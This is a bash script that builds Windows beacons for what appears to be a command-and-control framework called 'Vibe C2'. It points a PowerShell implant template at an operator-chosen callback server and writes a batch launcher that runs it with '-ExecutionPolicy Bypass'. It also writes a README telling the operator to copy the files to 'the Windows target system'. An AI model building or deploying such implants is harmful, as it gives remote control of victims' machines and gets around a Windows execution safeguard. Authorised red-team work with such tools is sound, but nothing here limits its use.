#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Get the directory where this script is located
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(cd "$SCRIPT_DIR/../.." && pwd)"

# Parse command line arguments
SERVER_URL="http://localhost:8080"

while [[ $# -gt 0 ]]; do
    case $1 in
        --server-url|--server|--remote-server)
            SERVER_URL="$2"
            shift 2
            ;;
        *)
            echo -e "${RED}[!]${NC} Unknown argument: $1"
            exit 1
            ;;
    esac
done

# Set output directory and file
OUTPUT_DIR="$PROJECT_ROOT/target/windows"
OUTPUT_FILE="$OUTPUT_DIR/vibe_beacon.exe"

# Create output directory if it doesn't exist
if [ ! -d "$OUTPUT_DIR" ]; then
    mkdir -p "$OUTPUT_DIR"
    echo -e "${BLUE}[*]${NC} Created output directory: $OUTPUT_DIR"
fi

print_banner() {
    echo ""
    echo -e "${CYAN}🌊  V I B E  C 2  F R A M E W O R K  🌊${NC}"
    echo -e "${CYAN}       Windows Beacon Generator${NC}"
    echo ""
}

# Generate a functional Windows PowerShell beacon
generate_windows_beacon() {
    echo -e "${BLUE}[*]${NC} Creating Windows PowerShell beacon..."
    
    # Create output PowerShell file
    PS_FILE="$OUTPUT_DIR/vibe_beacon.ps1"
    
    # Copy the base PowerShell script and replace the server URL
    cp "$SCRIPT_DIR/windows_ps_beacon.ps1" "$PS_FILE"
    
    # Replace server URL placeholder in the script
    sed -i "s|http://localhost:8080|$SERVER_URL|g" "$PS_FILE"
    
    echo -e "${GREEN}[+]${NC} Created Windows PowerShell beacon: $PS_FILE"
    
    # Create a batch launcher file for easier execution
    BATCH_FILE="${OUTPUT_FILE%.exe}.bat"
    cat > "$BATCH_FILE" << EOF
@echo off
echo Vibe C2 Beacon (Windows Edition)
echo Server URL: $SERVER_URL
echo.
echo Launching PowerShell beacon...
echo.
powershell.exe -ExecutionPolicy Bypass -File "%~dp0vibe_beacon.ps1"
EOF
    
    echo -e "${GREEN}[+]${NC} Created Windows batch launcher: $BATCH_FILE"
    
    # Create a README file with instructions
    README_FILE="$OUTPUT_DIR/README.txt"
    cat > "$README_FILE" << EOF
Vibe C2 Framework - Windows PowerShell Beacon

To run the beacon:
1. Transfer both the .ps1 and .bat files to the Windows target system
2. Double-click the .bat file to launch with execution policy bypass
   OR
3. Run directly from PowerShell with:
   powershell.exe -ExecutionPolicy Bypass -File vibe_beacon.ps1

Server URL: $SERVER_URL
Timestamp: $(date)
EOF
    
    echo -e "${GREEN}[+]${NC} Created README file: $README_FILE"
}

# Main execution
print_banner
generate_windows_beacon

echo -e "${CYAN}"
echo "🌊  V I B E  C 2  F R A M E W O R K  🌊"
echo "    Windows Beacon Build Complete!"
echo -e "${NC}"
